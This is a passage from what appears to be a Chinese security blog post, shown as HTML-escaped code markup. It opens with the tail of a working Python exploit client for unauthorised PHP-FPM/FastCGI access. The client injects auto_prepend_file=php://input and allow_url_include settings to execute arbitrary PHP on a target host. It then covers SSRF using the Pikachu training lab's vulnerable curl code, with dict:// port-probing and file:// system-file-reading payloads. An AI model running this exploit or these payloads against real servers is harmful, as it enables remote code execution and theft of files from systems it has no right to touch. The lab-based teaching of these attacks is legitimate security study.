class=&#34;string&#34;&gt;b&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        beginFCGIRecordContent = bchr(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                 + bchr(self.keepalive) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                 + bchr(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) * &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                              beginFCGIRecordContent, requestId)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        paramsRecord = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; nameValuePairs:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (name, value) &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; nameValuePairs.items():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                name = force_bytes(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                value = force_bytes(value)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                paramsRecord += self.__encodeNameValueParams(name, value)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; paramsRecord:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;#x27;&lt;/span&gt;, requestId)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; post:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;#x27;&lt;/span&gt;, requestId)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.sock.send(request)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.requests[requestId][&lt;span class=&#34;string&#34;&gt;&amp;#x27;state&amp;#x27;&lt;/span&gt;] = FastCGIClient.FCGI_STATE_SEND&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.requests[requestId][&lt;span class=&#34;string&#34;&gt;&amp;#x27;response&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; self.__waitForResponse(requestId)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__waitForResponse&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, requestId&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        data = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            buf = self.sock.recv(&lt;span class=&#34;number&#34;&gt;512&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(buf):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            data += buf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        data = BytesIO(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            response = self.__decodeFastCGIRecord(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; response:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; response[&lt;span class=&#34;string&#34;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;] == FastCGIClient.__FCGI_TYPE_STDOUT \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; response[&lt;span class=&#34;string&#34;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;] == FastCGIClient.__FCGI_TYPE_STDERR:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; response[&lt;span class=&#34;string&#34;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;] == FastCGIClient.__FCGI_TYPE_STDERR:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    self.requests[&lt;span class=&#34;string&#34;&gt;&amp;#x27;state&amp;#x27;&lt;/span&gt;] = FastCGIClient.FCGI_STATE_ERROR&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; requestId == &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(response[&lt;span class=&#34;string&#34;&gt;&amp;#x27;requestId&amp;#x27;&lt;/span&gt;]):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    self.requests[requestId][&lt;span class=&#34;string&#34;&gt;&amp;#x27;response&amp;#x27;&lt;/span&gt;] += response[&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; response[&lt;span class=&#34;string&#34;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;] == FastCGIClient.FCGI_STATE_SUCCESS:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                self.requests[requestId]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; self.requests[requestId][&lt;span class=&#34;string&#34;&gt;&amp;#x27;response&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__repr__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;fastcgi connect host:&amp;#123;&amp;#125; port:&amp;#123;&amp;#125;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(self.host, self.port)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parser = argparse.ArgumentParser(description=&lt;span class=&#34;string&#34;&gt;&amp;#x27;Php-fpm code execution vulnerability client.&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parser.add_argument(&lt;span class=&#34;string&#34;&gt;&amp;#x27;host&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;Target host, such as 127.0.0.1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parser.add_argument(&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;A php file absolute path, such as /usr/local/lib/php/System.php&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parser.add_argument(&lt;span class=&#34;string&#34;&gt;&amp;#x27;-c&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;--code&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;What php code your want to execute&amp;#x27;&lt;/span&gt;, default=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;?php phpinfo(); exit; ?&amp;gt;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parser.add_argument(&lt;span class=&#34;string&#34;&gt;&amp;#x27;-p&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;--port&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;FastCGI port&amp;#x27;&lt;/span&gt;, default=&lt;span class=&#34;number&#34;&gt;9000&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    args = parser.parse_args()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    client = FastCGIClient(args.host, args.port, &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    params = &lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    documentRoot = &lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uri = args.file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    content = args.code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    params = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;GATEWAY_INTERFACE&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;FastCGI/1.0&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;REQUEST_METHOD&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;SCRIPT_FILENAME&amp;#x27;&lt;/span&gt;: documentRoot + uri.lstrip(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;SCRIPT_NAME&amp;#x27;&lt;/span&gt;: uri,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;QUERY_STRING&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;REQUEST_URI&amp;#x27;&lt;/span&gt;: uri,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;DOCUMENT_ROOT&amp;#x27;&lt;/span&gt;: documentRoot,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;SERVER_SOFTWARE&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;php/fcgiclient&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;REMOTE_ADDR&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;127.0.0.1&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;REMOTE_PORT&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;12345&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;SERVER_ADDR&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;127.0.0.1&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;SERVER_PORT&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;80&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;SERVER_NAME&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;SERVER_PROTOCOL&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;HTTP/1.1&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;CONTENT_TYPE&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;application/text&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;CONTENT_LENGTH&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt; % &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(content),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;PHP_VALUE&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;auto_prepend_file = php://input&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;PHP_ADMIN_VALUE&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;allow_url_include = On&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    response = client.request(params, content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(force_text(response))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;又是参考 P 师傅的一天～&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vZmFzdGNnaS1hbmQtcGhwLWZwbS5odG1s&#34;&gt;Fastcgi 协议分析 &amp;amp;&amp;amp; PHP-FPM 未授权访问漏洞 &amp;amp;&amp;amp; Exp 编写 | 离别歌 (leavesongs.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3RhcnVua2FudC9Hb3BoZXJ1cw==&#34;&gt;tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servers (github.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3VuZXhwZWN0ZWR0aGluZy9hcnRpY2xlL2RldGFpbHMvMTIxNjQzMDAy&#34;&gt;SSRF–gopher 协议打 FastCGI_Z3eyOnd 的博客 - CSDN 博客_gopher fastcgi&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;ssrf-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf-2&#34;&gt;#&lt;/a&gt; SSRF&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;SSRF (Server-Side Request Forgery: 服务器端请求伪造)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其形成的原因大都是由于服务端&lt;strong&gt;提供了从其他服务器应用获取数据的功能&lt;/strong&gt;，但又没有对目标地址做严格过滤与限制&lt;/p&gt;
&lt;p&gt;导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据&lt;/p&gt;
&lt;p&gt;数据流：攻击者 -----&amp;gt; 服务器 ----&amp;gt; 目标地址&lt;/p&gt;
&lt;p&gt;根据后台使用的函数的不同，对应的影响和利用方法又有不一样&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PHP中下面函数的使用不当会导致SSRF:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file_get_contents()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fsockopen()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl_exec()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但注意 curl_exec () 不支持 php://filter 等伪协议，支持 dict&lt;/p&gt;
&lt;p&gt;但 file_get_contens () 支持 php://filter 伪协议读文件，不支持 dict&lt;/p&gt;
&lt;p&gt;如果一定要通过后台服务器远程去对用户指定 (“或者预埋在前端的请求”) 的地址进行资源请求，&lt;strong&gt; 则请做好目标地址的过滤&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;pikachu-curl-ssrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pikachu-curl-ssrf&#34;&gt;#&lt;/a&gt; pikachu - curl ssrf&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(isset($_GET[&amp;#x27;url&amp;#x27;]) &amp;amp;&amp;amp; $_GET[&amp;#x27;url&amp;#x27;] != null)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $URL = $_GET[&amp;#x27;url&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $CH = curl_init($URL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    curl_setopt($CH, CURLOPT_HEADER, FALSE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $RES = curl_exec($CH);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    curl_close($CH) ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    echo $RES;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?url=dict://127.0.0.1:3306&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;N 5.5.62-log=gnsw|+\��!�n5[KF\&amp;#123;wdo&amp;quot;Umysql_native_password!��#08S01Got packets out of order1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?url=file:///C:\Windows\system.ini&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220325170713312.png&#34; alt=&#34;image-20220325170713312&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl_init &lt;/code&gt; 只能用于 &lt;code&gt;tcp&lt;/code&gt;  协议，因此可以用于读取文件或检测端口是否开启&lt;/p&gt;
&lt;h4 id=&#34;pikachu-file_get_contents-ssrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pikachu-file_get_contents-ssrf&#34;&gt;#&lt;/a&gt; pikachu-file_get_contents ssrf&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;file_get_contents&lt;/code&gt;  可以接收 &lt;code&gt;php&lt;/code&gt;  伪协议&lt;/p&gt;
